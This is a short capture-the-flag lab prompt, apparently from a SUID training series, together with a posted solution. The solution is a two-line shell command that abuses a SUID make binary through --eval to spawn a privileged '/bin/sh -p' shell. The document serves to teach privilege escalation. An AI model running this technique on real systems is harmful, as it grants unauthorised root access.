Welcome to /challenge/babysuid_level26!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/make.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level26) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/make!

//SOLUZIONE

hacker@babysuid_level26:~$ COMMAND='/bin/sh -p'
hacker@babysuid_level26:~$ make -s --eval=$'x:\n\t-'"$COMMAND"
